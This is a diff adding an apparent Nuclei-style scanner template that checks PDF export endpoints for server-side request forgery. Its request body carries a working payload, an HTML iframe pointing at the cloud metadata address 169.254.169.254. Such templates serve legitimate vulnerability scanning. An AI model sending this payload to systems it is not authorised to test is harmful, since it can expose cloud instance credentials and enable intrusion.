@@ -1,0 +1,31 @@
+id: whai-ssrf-html-to-pdf
+
+info:
+  name: SSRF via HTML-to-PDF Renderer
+  author: whitehat-ai
+  severity: high
+  description: Tests SSRF in PDF generation via iframe/embed
+  tags: ssrf,pdf,wkhtmltopdf,high
+  classification:
+    cwe-id: CWE-918
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/pdf"
+      - "{{BaseURL}}/api/export/pdf"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"html":"<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
